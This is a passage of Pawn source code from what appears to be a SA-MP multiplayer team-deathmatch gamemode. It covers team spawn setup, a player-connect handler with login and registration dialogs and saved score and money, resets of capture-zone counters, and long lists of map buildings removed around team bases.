			SetPlayerColor(playerid, TEAM_NEPAL_COLOR);
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		}
		case 5:
		{
			// Dubai //
			SetPlayerPos(playerid, 219.4820,1822.7864,7.5271);
	        SetPlayerCameraPos(playerid, 225.7349,1822.9067, 7.521);
	        SetPlayerFacingAngle( playerid, 270);
	        SetPlayerCameraLookAt(playerid, 219.4820,1822.7864,7.5271);
			TextDrawHideForPlayer(playerid, A);
			TextDrawHideForPlayer(playerid, S);
			TextDrawShowForPlayer(playerid, Tur);
			TextDrawHideForPlayer(playerid, A2);
			TextDrawHideForPlayer(playerid, U);
			TextDrawHideForPlayer(playerid, E);
			TextDrawHideForPlayer(playerid, ML);
			SetPlayerTeam(playerid, 5);
			SetPlayerSkin(playerid, 108);
			gTeam[playerid] = TEAM_DUBAI;
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		}
		case 6:
		{
			// Malaysia //
			SetPlayerPos(playerid, 219.4820,1822.7864,7.5271);
	        SetPlayerCameraPos(playerid, 225.7349,1822.9067, 7.521);
	        SetPlayerFacingAngle( playerid, 270);
	        SetPlayerCameraLookAt(playerid, 219.4820,1822.7864,7.5271);
			TextDrawHideForPlayer(playerid, A);
			TextDrawHideForPlayer(playerid, S);
			TextDrawShowForPlayer(playerid, ML);
			TextDrawHideForPlayer(playerid, Tur);
			TextDrawHideForPlayer(playerid, A2);
			TextDrawHideForPlayer(playerid, U);
			TextDrawHideForPlayer(playerid, E);
			SetPlayerTeam(playerid, 6);
			SetPlayerSkin(playerid, 115);
			gTeam[playerid] = TEAM_ML;
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		}
	}
	return 1;
}

public OnPlayerConnect(playerid)
{
    //**********//
    Invited[playerid]= -1;
    Dueling[playerid]= false;
    Duelist[playerid]= -1;
    TextDrawShowForPlayer(playerid, Rules);
    TextDrawShowForPlayer(playerid, StartLogo);
    /*TextDrawShowForPlayer(playerid, startbox);
    TextDrawShowForPlayer(playerid, welcome);
    TextDrawShowForPlayer(playerid, to);
    TextDrawShowForPlayer(playerid, advance);
    TextDrawShowForPlayer(playerid, copyright);*/
    format(MessageStrl6, 170, MessageStrl5);
    format(MessageStrl5, 170, MessageStrl4);
    format(MessageStrl4, 170, MessageStrl3);
    format(MessageStrl3, 170, MessageStrl2);
    format(MessageStrl2, 170, MessageStr);
    new name[MAX_PLAYER_NAME+1];
    GetPlayerName(playerid, name, sizeof(name)); // getting the player name
    format(MessageStr,sizeof MessageStr,"~g~[JOIN]~w~%s(~g~%d~w~) has ~g~joined ~w~the server.", name, playerid); //formatting line 3 text
    new STR[510]; //creating a new string to merge the 3 strings into a one 3 lines string
    format(STR, sizeof(STR), "%s~n~%s~n~%s~n~%s~n~%s~n~%s",  MessageStrl6,MessageStrl5,MessageStrl4,MessageStrl3, MessageStrl2, MessageStr); //formatting the newly created string
    TextDrawSetString(Message, STR); //showing it on the screen


    if (udb_Exists(PlayerName2(playerid)))
    {
	  if(PlayerInfo[playerid][LoggedIn] == 0)
	  {
		  new string[200];
		  format(string, sizeof(string),""cblue"Welcome "cred"%s "cblue"you are already registered\nKindly enter password to login to your account", PlayerName2(playerid));
	      ShowPlayerDialog(playerid, 125, DIALOG_STYLE_PASSWORD, "Login",string,"Login","Kick");
      }
    }
    if (!udb_Exists(PlayerName2(playerid)))
	{
      if(PlayerInfo[playerid][Registered] == 0)
	  {
	      new string[200];
		  format(string, sizeof(string),""cgreen"Welcome "cred"%s "cgreen"you are not registered\nKindly enter password to register your account", PlayerName2(playerid));
	      ShowPlayerDialog(playerid, 126, DIALOG_STYLE_PASSWORD, "Register",string,"Register","Kick");
      }
    }
    if(PlayerInfo[playerid][LoggedIn] == 1)
    {
        new pname[128];
	    new file[128];
	    GetPlayerName(playerid, pname, sizeof(pname));
        format(file, sizeof(file), savefolder,pname);
        if(!dini_Exists(file))
		{
	        dini_Create(file);
	        dini_IntSet(file, "Score", 0);
	        dini_IntSet(file, "Money", 0);
	        SetPlayerScore(playerid, dini_Int(file, "Score"));
	        SetPlayerMoney(playerid, dini_Int(file, "Money"));
        }
        else
		{
	        SetPlayerScore(playerid, dini_Int(file, "Score"));
	        SetPlayerMoney(playerid, dini_Int(file, "Money"));
	    }
	}
	//-----
	SetPlayerWorldBounds(playerid, 9999.9, -9999.9, 9999.9, -9999.9 );
	//-----
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");
	SendClientMessage(playerid, -1," ");

	LastPm[playerid] = -1;
	Spectating[playerid] = 0;
	FirstSpawn[playerid] = 1;
	rconAttempts[playerid] = 0;

	IsPlayerCapturing[playerid][SNAKE] = 0;
	IsPlayerCapturing[playerid][BAY] = 0;
	IsPlayerCapturing[playerid][BIG] = 0;
	IsPlayerCapturing[playerid][ARMY] = 0;
	IsPlayerCapturing[playerid][PETROL] = 0;
	IsPlayerCapturing[playerid][OIL] = 0;
	IsPlayerCapturing[playerid][DESERT] = 0;
	IsPlayerCapturing[playerid][QUARRY] = 0;
	IsPlayerCapturing[playerid][GUEST] = 0;
	IsPlayerCapturing[playerid][EAR] = 0;
	IsPlayerCapturing[playerid][AIRPORT] = 0;
	IsPlayerCapturing[playerid][SHIP] = 0;
	IsPlayerCapturing[playerid][GAS] = 0;
	IsPlayerCapturing[playerid][RES] = 0;
	//IsPlayerCapturing[playerid][NPP] = 0;
	IsPlayerCapturing[playerid][MOTEL] = 0;
	IsPlayerCapturing[playerid][BATTLESHIP] = 0;
	IsPlayerCapturing[playerid][HOSPITAL] = 0;

	CountVar[playerid][SNAKE] = 25;
	CountVar[playerid][BAY] = 25;
	CountVar[playerid][BIG] = 25;
	CountVar[playerid][PETROL] = 25;
	CountVar[playerid][ARMY] = 25;
	CountVar[playerid][DESERT] = 25;
	CountVar[playerid][OIL] = 25;
	CountVar[playerid][QUARRY] = 25;
	CountVar[playerid][GUEST] = 25;
	CountVar[playerid][EAR] = 25;
	CountVar[playerid][AIRPORT] = 25;
	CountVar[playerid][SHIP] = 25;
	CountVar[playerid][GAS] = 25;
	CountVar[playerid][RES] = 25;
	//CountVar[playerid][NPP] = 25;
	CountVar[playerid][MOTEL] = 25;
	CountVar[playerid][BATTLESHIP] = 25;
	CountVar[playerid][HOSPITAL] = 25;

	DND[playerid] = 0;
	//-------------
//Desert Airport
RemoveBuildingForPlayer(playerid, 3345, 400.1172, 2543.5703, 15.4844, 0.25);
RemoveBuildingForPlayer(playerid, 3368, 161.7891, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3368, 323.0078, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3369, 349.8750, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3369, 269.2656, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3369, 242.3984, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3369, 188.6563, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3369, 108.0469, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3367, 296.1406, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3367, 215.5313, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3367, 134.9141, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 16595, 419.3750, 2538.5000, 15.5391, 0.25);
RemoveBuildingForPlayer(playerid, 16596, 412.8281, 2542.8672, 15.5391, 0.25);
RemoveBuildingForPlayer(playerid, 16686, 32.9844, 2503.5859, 15.5078, 0.25);
RemoveBuildingForPlayer(playerid, 16687, 329.8984, 2504.2656, 15.5703, 0.25);
RemoveBuildingForPlayer(playerid, 3269, 108.0469, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3270, 161.7891, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3269, 188.6563, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3271, 134.9141, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3271, 215.5313, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3269, 242.3984, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3269, 269.2656, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3271, 296.1406, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3270, 323.0078, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3269, 349.8750, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 16684, 329.8984, 2504.2656, 15.5703, 0.25);
RemoveBuildingForPlayer(playerid, 1224, 410.8281, 2528.5703, 16.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1224, 409.8047, 2529.6328, 16.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1224, 408.7188, 2530.7656, 16.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1224, 407.1563, 2530.4688, 16.1563, 0.25);
RemoveBuildingForPlayer(playerid, 3172, 400.1172, 2543.5703, 15.4844, 0.25);
RemoveBuildingForPlayer(playerid, 1224, 407.8828, 2532.0078, 16.1563, 0.25);
RemoveBuildingForPlayer(playerid, 16326, 419.3750, 2538.5000, 15.5391, 0.25);
RemoveBuildingForPlayer(playerid, 16377, 416.1875, 2533.8281, 19.1328, 0.25);
RemoveBuildingForPlayer(playerid, 16378, 414.4063, 2536.5469, 18.8984, 0.25);
RemoveBuildingForPlayer(playerid, 16327, 412.8281, 2542.8672, 15.5391, 0.25);
RemoveBuildingForPlayer(playerid, 16790, 425.4688, 2531.0000, 22.5547, 0.25);
RemoveBuildingForPlayer(playerid, 1498, 422.8281, 2535.7344, 15.1406, 0.25);
RemoveBuildingForPlayer(playerid, 16685, 32.9844, 2503.5859, 15.5078, 0.25);
//Area 51
RemoveBuildingForPlayer(playerid, 16094, 191.1406, 1870.0391, 21.4766, 0.25);
//Pak Base
RemoveBuildingForPlayer(playerid, 11617, -659.9063, 874.8047, 0.9922, 0.25);
RemoveBuildingForPlayer(playerid, 691, -773.9922, 813.5938, 11.3750, 0.25);
RemoveBuildingForPlayer(playerid, 705, -756.3516, 871.1563, 10.9297, 0.25);
RemoveBuildingForPlayer(playerid, 691, -739.1094, 907.2031, 11.4688, 0.25);
RemoveBuildingForPlayer(playerid, 691, -744.9922, 924.6953, 10.0547, 0.25);
RemoveBuildingForPlayer(playerid, 11494, -659.9063, 874.8047, 0.9922, 0.25);
RemoveBuildingForPlayer(playerid, 700, -658.8203, 936.1797, 11.2500, 0.25);
RemoveBuildingForPlayer(playerid, 669, -656.5781, 974.4688, 11.2734, 0.25);
RemoveBuildingForPlayer(playerid, 691, -638.1563, 954.7031, 9.3359, 0.25);
//India Base
RemoveBuildingForPlayer(playerid, 11670, -793.1563, 1557.0391, 33.2344, 0.25);
RemoveBuildingForPlayer(playerid, 11478, -814.3125, 1458.8828, 23.7891, 0.25);
RemoveBuildingForPlayer(playerid, 3243, -817.7656, 1450.3203, 12.9531, 0.25);
RemoveBuildingForPlayer(playerid, 3243, -804.0703, 1450.2109, 12.9531, 0.25);
RemoveBuildingForPlayer(playerid, 3243, -812.7813, 1424.3047, 12.9531, 0.25);
RemoveBuildingForPlayer(playerid, 3243, -797.9766, 1424.2813, 12.9531, 0.25);
RemoveBuildingForPlayer(playerid, 11427, -793.1563, 1557.0391, 33.2344, 0.25);
RemoveBuildingForPlayer(playerid, 3243, -789.4922, 1449.8359, 12.9531, 0.25);
RemoveBuildingForPlayer(playerid, 3243, -784.7109, 1424.3438, 12.9531, 0.25);
RemoveBuildingForPlayer(playerid, 3243, -777.0859, 1449.6484, 12.9531, 0.25);
RemoveBuildingForPlayer(playerid, 3243, -771.9844, 1424.1328, 12.9531, 0.25);
RemoveBuildingForPlayer(playerid, 11437, -775.5938, 1555.6797, 26.0938, 0.25);
RemoveBuildingForPlayer(playerid, 700, -781.1016, 1594.1172, 25.8125, 0.25);
RemoveBuildingForPlayer(playerid, 669, -783.1875, 1601.2266, 26.2031, 0.25);
RemoveBuildingForPlayer(playerid, 11567, -756.1016, 1638.7656, 25.7734, 0.25);
//Nepal Base
RemoveBuildingForPlayer(playerid, 3300, -1464.3438, 2656.5000, 56.6484, 0.25);
RemoveBuildingForPlayer(playerid, 11599, -1512.1563, 2514.4453, 54.8906, 0.25);
RemoveBuildingForPlayer(playerid, 11600, -1520.9766, 2620.0938, 57.4453, 0.25);
RemoveBuildingForPlayer(playerid, 3341, -1446.4531, 2639.3516, 54.8047, 0.25);
RemoveBuildingForPlayer(playerid, 3341, -1477.5859, 2549.2344, 54.8047, 0.25);
RemoveBuildingForPlayer(playerid, 3339, -1510.3516, 2646.6563, 54.7266, 0.25);
RemoveBuildingForPlayer(playerid, 3339, -1476.0391, 2565.3984, 54.7266, 0.25);
RemoveBuildingForPlayer(playerid, 3342, -1447.2344, 2653.3047, 54.8203, 0.25);
RemoveBuildingForPlayer(playerid, 3345, -1448.8594, 2560.5703, 54.8281, 0.25);
RemoveBuildingForPlayer(playerid, 3357, -1523.8047, 2656.6563, 54.8750, 0.25);
RemoveBuildingForPlayer(playerid, 11672, -1520.9609, 2577.1641, 58.3125, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1607.3125, 2564.3203, 70.4609, 0.25);
RemoveBuildingForPlayer(playerid, 703, -1588.9141, 2562.0391, 67.5703, 0.25);
RemoveBuildingForPlayer(playerid, 672, -1591.7344, 2597.7344, 65.5938, 0.25);
RemoveBuildingForPlayer(playerid, 700, -1548.3906, 2495.7344, 55.1250, 0.25);
RemoveBuildingForPlayer(playerid, 703, -1554.9922, 2510.0703, 57.0547, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1530.5547, 2493.4609, 55.2422, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1535.4766, 2505.7578, 55.2422, 0.25);
RemoveBuildingForPlayer(playerid, 11454, -1512.1563, 2514.4453, 54.8906, 0.25);
RemoveBuildingForPlayer(playerid, 672, -1492.7813, 2518.5938, 55.7578, 0.25);
RemoveBuildingForPlayer(playerid, 11625, -1430.5781, 2303.7578, 62.0625, 0.25);
RemoveBuildingForPlayer(playerid, 700, -1559.2891, 2530.0156, 60.0156, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1544.5781, 2524.6328, 55.2422, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1540.1563, 2590.8125, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 11456, -1520.9609, 2577.1641, 58.3125, 0.25);
RemoveBuildingForPlayer(playerid, 11455, -1505.4609, 2539.4922, 56.7891, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1515.5547, 2595.2969, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1294, -1520.8906, 2605.4219, 59.2734, 0.25);
RemoveBuildingForPlayer(playerid, 1522, -1509.6563, 2611.1172, 54.8750, 0.25);
RemoveBuildingForPlayer(playerid, 11449, -1520.9766, 2620.0938, 57.4453, 0.25);
RemoveBuildingForPlayer(playerid, 11460, -1523.2891, 2618.5938, 65.4219, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1515.2578, 2635.2188, 55.2422, 0.25);
RemoveBuildingForPlayer(playerid, 3169, -1510.3516, 2646.6563, 54.7266, 0.25);
RemoveBuildingForPlayer(playerid, 3169, -1476.0391, 2565.3984, 54.7266, 0.25);
RemoveBuildingForPlayer(playerid, 3170, -1477.5859, 2549.2344, 54.8047, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1470.7891, 2553.7109, 55.2422, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1462.4063, 2527.0078, 54.0547, 0.25);
RemoveBuildingForPlayer(playerid, 672, -1458.9531, 2565.6641, 55.8281, 0.25);
RemoveBuildingForPlayer(playerid, 700, -1459.3203, 2552.8281, 55.2266, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1464.2500, 2556.2344, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1467.9531, 2595.4297, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1486.0000, 2607.6406, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1460.7891, 2611.2422, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1490.3203, 2632.8828, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 672, -1454.2734, 2640.1406, 55.8281, 0.25);
RemoveBuildingForPlayer(playerid, 11461, -1466.0313, 2637.5938, 54.3906, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1457.8672, 2648.9922, 55.2422, 0.25);
RemoveBuildingForPlayer(playerid, 3172, -1448.8594, 2560.5703, 54.8281, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1437.4141, 2558.0859, 54.9531, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1436.1094, 2607.3906, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 672, -1403.4766, 2611.8047, 55.5781, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1393.0625, 2616.0859, 54.8125, 0.25);
RemoveBuildingForPlayer(playerid, 3170, -1446.4531, 2639.3516, 54.8047, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1438.6719, 2630.0234, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 700, -1375.3594, 2630.2734, 53.1719, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1368.5938, 2635.2422, 51.7344, 0.25);
RemoveBuildingForPlayer(playerid, 700, -1441.7891, 2647.3281, 55.2266, 0.25);
RemoveBuildingForPlayer(playerid, 11453, -1414.5078, 2650.4844, 57.5625, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1536.2891, 2661.4688, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1506, -1532.1328, 2657.4063, 55.2656, 0.25);
RemoveBuildingForPlayer(playerid, 3355, -1523.8047, 2656.6563, 54.8750, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1517.7422, 2677.1484, 55.1797, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1486.3359, 2657.2578, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 3173, -1447.2344, 2653.3047, 54.8203, 0.25);
RemoveBuildingForPlayer(playerid, 3285, -1464.3438, 2656.5000, 56.6484, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1485.8516, 2680.7422, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1436.1016, 2655.4766, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 672, -1391.0469, 2667.0781, 54.7422, 0.25);
//China Base
RemoveBuildingForPlayer(playerid, 16413, -174.2109, 1120.4531, 24.4063, 0.25);
RemoveBuildingForPlayer(playerid, 16443, -161.1719, 1179.5313, 22.4922, 0.25);
RemoveBuildingForPlayer(playerid, 16447, -219.3750, 1176.6563, 22.1641, 0.25);
RemoveBuildingForPlayer(playerid, 3344, -235.8594, 1051.3047, 18.6719, 0.25);
RemoveBuildingForPlayer(playerid, 16476, -98.1953, 1180.0703, 18.7344, 0.25);
RemoveBuildingForPlayer(playerid, 16617, -122.7422, 1122.7500, 18.7344, 0.25);
RemoveBuildingForPlayer(playerid, 16618, -117.7656, 1079.4609, 22.2188, 0.25);
RemoveBuildingForPlayer(playerid, 780, -209.1641, 1005.5625, 18.1797, 0.25);
RemoveBuildingForPlayer(playerid, 773, -238.0625, 1030.9063, 18.5000, 0.25);
RemoveBuildingForPlayer(playerid, 16738, -217.4922, 1026.8203, 27.6797, 0.25);
RemoveBuildingForPlayer(playerid, 1345, -169.9766, 1027.1953, 19.4453, 0.25);
RemoveBuildingForPlayer(playerid, 3171, -235.8594, 1051.3047, 18.6719, 0.25);
RemoveBuildingForPlayer(playerid, 669, -228.8281, 1050.7500, 18.8125, 0.25);
RemoveBuildingForPlayer(playerid, 700, -240.0625, 1050.6328, 19.0156, 0.25);
RemoveBuildingForPlayer(playerid, 16061, -193.3750, 1055.2891, 18.3203, 0.25);
RemoveBuildingForPlayer(playerid, 669, -233.1172, 1061.6563, 18.8594, 0.25);
RemoveBuildingForPlayer(playerid, 1468, -161.0156, 1011.1953, 19.9375, 0.25);
RemoveBuildingForPlayer(playerid, 773, -154.1953, 1012.9453, 18.3281, 0.25);
RemoveBuildingForPlayer(playerid, 1468, -161.0156, 1021.7500, 19.9375, 0.25);
RemoveBuildingForPlayer(playerid, 1468, -161.0156, 1016.4766, 19.9375, 0.25);
RemoveBuildingForPlayer(playerid, 1468, -161.0156, 1027.0234, 19.9375, 0.25);
RemoveBuildingForPlayer(playerid, 700, -64.0313, 1009.6719, 18.8438, 0.25);
RemoveBuildingForPlayer(playerid, 774, -82.9688, 1022.7813, 18.6328, 0.25);
RemoveBuildingForPlayer(playerid, 700, -127.8750, 1058.6641, 19.0156, 0.25);
RemoveBuildingForPlayer(playerid, 1468, -161.0156, 1032.3047, 19.9375, 0.25);
RemoveBuildingForPlayer(playerid, 780, -147.2500, 1055.5156, 18.8750, 0.25);
RemoveBuildingForPlayer(playerid, 669, -120.4766, 1061.2109, 18.6797, 0.25);
RemoveBuildingForPlayer(playerid, 652, -82.2969, 1060.2734, 18.4531, 0.25);
RemoveBuildingForPlayer(playerid, 769, -96.9453, 1054.9297, 18.0469, 0.25);
RemoveBuildingForPlayer(playerid, 1468, -75.6953, 1071.1641, 19.9375, 0.25);
RemoveBuildingForPlayer(playerid, 700, -160.5156, 1066.0703, 19.0156, 0.25);
RemoveBuildingForPlayer(playerid, 669, -164.3750, 1078.3906, 17.7656, 0.25);
RemoveBuildingForPlayer(playerid, 1468, -75.6953, 1076.4453, 19.9375, 0.25);
RemoveBuildingForPlayer(playerid, 1411, -146.9297, 1108.2344, 20.3359, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -166.7500, 1107.9688, 18.7344, 0.25);
RemoveBuildingForPlayer(playerid, 16070, -174.2109, 1120.4531, 24.4063, 0.25);
RemoveBuildingForPlayer(playerid, 1345, -160.2656, 1122.5391, 19.5391, 0.25);
RemoveBuildingForPlayer(playerid, 1692, -161.7656, 1115.8516, 27.2969, 0.25);
RemoveBuildingForPlayer(playerid, 16760, -178.2031, 1122.3203, 28.8594, 0.25);
RemoveBuildingForPlayer(playerid, 1447, -154.8281, 1137.1406, 20.0078, 0.25);
RemoveBuildingForPlayer(playerid, 1447, -160.0703, 1137.1406, 20.0078, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -162.1953, 1136.2266, 18.7344, 0.25);
RemoveBuildingForPlayer(playerid, 16740, -152.3203, 1144.0703, 30.3047, 0.25);
RemoveBuildingForPlayer(playerid, 16060, -192.0469, 1147.3906, 17.6953, 0.25);
RemoveBuildingForPlayer(playerid, 1345, -218.0313, 1164.9219, 19.5391, 0.25);
RemoveBuildingForPlayer(playerid, 16064, -161.1719, 1179.5313, 22.4922, 0.25);
RemoveBuildingForPlayer(playerid, 16065, -219.3750, 1176.6563, 22.1641, 0.25);
RemoveBuildingForPlayer(playerid, 1692, -174.2422, 1177.8984, 22.7813, 0.25);
RemoveBuildingForPlayer(playerid, 3286, -230.2031, 1185.7734, 23.3516, 0.25);
RemoveBuildingForPlayer(playerid, 16386, -117.7656, 1079.4609, 22.2188, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -111.7422, 1087.5000, 19.4844, 0.25);
RemoveBuildingForPlayer(playerid, 1468, -75.6953, 1081.7188, 19.9375, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -86.8438, 1088.4141, 19.4844, 0.25);
RemoveBuildingForPlayer(playerid, 1411, -136.5391, 1108.2344, 20.3359, 0.25);
RemoveBuildingForPlayer(playerid, 1411, -141.7344, 1108.2344, 20.3359, 0.25);
RemoveBuildingForPlayer(playerid, 1412, -133.9844, 1111.0781, 20.0234, 0.25);
RemoveBuildingForPlayer(playerid, 669, -120.8750, 1110.4219, 18.6797, 0.25);
RemoveBuildingForPlayer(playerid, 16385, -122.7422, 1122.7500, 18.7344, 0.25);
RemoveBuildingForPlayer(playerid, 1412, -133.8516, 1134.4141, 20.0234, 0.25);
RemoveBuildingForPlayer(playerid, 1468, -90.9922, 1141.0000, 19.9375, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -133.3594, 1137.5938, 18.7344, 0.25);
RemoveBuildingForPlayer(playerid, 16735, -49.2422, 1137.7031, 28.7813, 0.25);
RemoveBuildingForPlayer(playerid, 1468, -90.9922, 1146.2734, 19.9375, 0.25);
RemoveBuildingForPlayer(playerid, 780, -84.8906, 1143.4375, 18.4219, 0.25);
RemoveBuildingForPlayer(playerid, 1468, -90.9922, 1151.5469, 19.9375, 0.25);
RemoveBuildingForPlayer(playerid, 652, -81.0859, 1149.6406, 18.4531, 0.25);
RemoveBuildingForPlayer(playerid, 700, -126.1719, 1159.0703, 19.0156, 0.25);
RemoveBuildingForPlayer(playerid, 1345, -88.8594, 1165.3828, 19.4609, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -96.7188, 1164.3516, 18.7344, 0.25);
RemoveBuildingForPlayer(playerid, 669, -127.0000, 1173.4219, 18.6797, 0.25);
RemoveBuildingForPlayer(playerid, 16475, -98.1953, 1180.0703, 18.7344, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -76.5313, 1187.6406, 18.7344, 0.25);
//USA Base
RemoveBuildingForPlayer(playerid, 3301, -282.2266, 2719.2578, 63.5703, 0.25);
RemoveBuildingForPlayer(playerid, 3299, -314.1875, 2720.6406, 62.2109, 0.25);
RemoveBuildingForPlayer(playerid, 3297, -147.7891, 2684.8125, 63.2188, 0.25);
RemoveBuildingForPlayer(playerid, 3345, -167.6797, 2767.1328, 61.5781, 0.25);
RemoveBuildingForPlayer(playerid, 3343, -154.5547, 2761.0078, 61.5781, 0.25);
RemoveBuildingForPlayer(playerid, 3342, -275.1797, 2738.4844, 61.3047, 0.25);
RemoveBuildingForPlayer(playerid, 3341, -289.7422, 2758.2344, 61.0625, 0.25);
RemoveBuildingForPlayer(playerid, 16764, -288.8359, 2682.4297, 61.6563, 0.25);
RemoveBuildingForPlayer(playerid, 16765, -227.4531, 2716.3516, 62.1719, 0.25);
RemoveBuildingForPlayer(playerid, 16019, -352.1484, 2648.0547, 64.3672, 0.25);
RemoveBuildingForPlayer(playerid, 16402, -318.2891, 2650.2422, 69.0156, 0.25);
RemoveBuildingForPlayer(playerid, 16776, -237.0234, 2662.8359, 62.6094, 0.25);
RemoveBuildingForPlayer(playerid, 1340, -197.4922, 2659.9141, 62.8203, 0.25);
RemoveBuildingForPlayer(playerid, 16062, -222.6641, 2663.3047, 66.2344, 0.25);
RemoveBuildingForPlayer(playerid, 16063, -222.3438, 2663.4531, 71.0156, 0.25);
RemoveBuildingForPlayer(playerid, 669, -206.6328, 2672.2422, 61.8438, 0.25);
RemoveBuildingForPlayer(playerid, 669, -278.9688, 2679.0234, 61.8438, 0.25);
RemoveBuildingForPlayer(playerid, 16396, -288.8359, 2682.4297, 61.6563, 0.25);
RemoveBuildingForPlayer(playerid, 669, -156.0234, 2675.2031, 61.8438, 0.25);
RemoveBuildingForPlayer(playerid, 672, -243.0313, 2688.3047, 62.4844, 0.25);
RemoveBuildingForPlayer(playerid, 3284, -282.2266, 2719.2578, 63.5703, 0.25);
RemoveBuildingForPlayer(playerid, 669, -333.5703, 2719.3516, 61.8672, 0.25);
RemoveBuildingForPlayer(playerid, 3283, -314.1875, 2720.6406, 62.2109, 0.25);
RemoveBuildingForPlayer(playerid, 672, -240.8359, 2737.1484, 62.4844, 0.25);
RemoveBuildingForPlayer(playerid, 3173, -275.1797, 2738.4844, 61.3047, 0.25);
RemoveBuildingForPlayer(playerid, 669, -269.6953, 2750.4609, 61.8438, 0.25);
RemoveBuildingForPlayer(playerid, 3170, -289.7422, 2758.2344, 61.0625, 0.25);
RemoveBuildingForPlayer(playerid, 669, -297.8047, 2755.1875, 61.8438, 0.25);
RemoveBuildingForPlayer(playerid, 669, -232.1641, 2685.2734, 61.8438, 0.25);
RemoveBuildingForPlayer(playerid, 669, -202.5703, 2687.9688, 61.8438, 0.25);
RemoveBuildingForPlayer(playerid, 16011, -227.4531, 2716.3516, 62.1719, 0.25);
RemoveBuildingForPlayer(playerid, 3172, -167.6797, 2767.1328, 61.5781, 0.25);
RemoveBuildingForPlayer(playerid, 669, -174.5547, 2769.4609, 61.1094, 0.25);
RemoveBuildingForPlayer(playerid, 3168, -154.5547, 2761.0078, 61.5781, 0.25);
RemoveBuildingForPlayer(playerid, 3242, -147.7891, 2684.8125, 63.2188, 0.25);
//Dubai Base
RemoveBuildingForPlayer(playerid, 7618, 1017.5703, 2123.0781, 13.2656, 0.25);
RemoveBuildingForPlayer(playerid, 7667, 1139.7578, 2132.6406, 15.9219, 0.25);
RemoveBuildingForPlayer(playerid, 7669, 1044.5234, 2347.9297, 13.3984, 0.25);
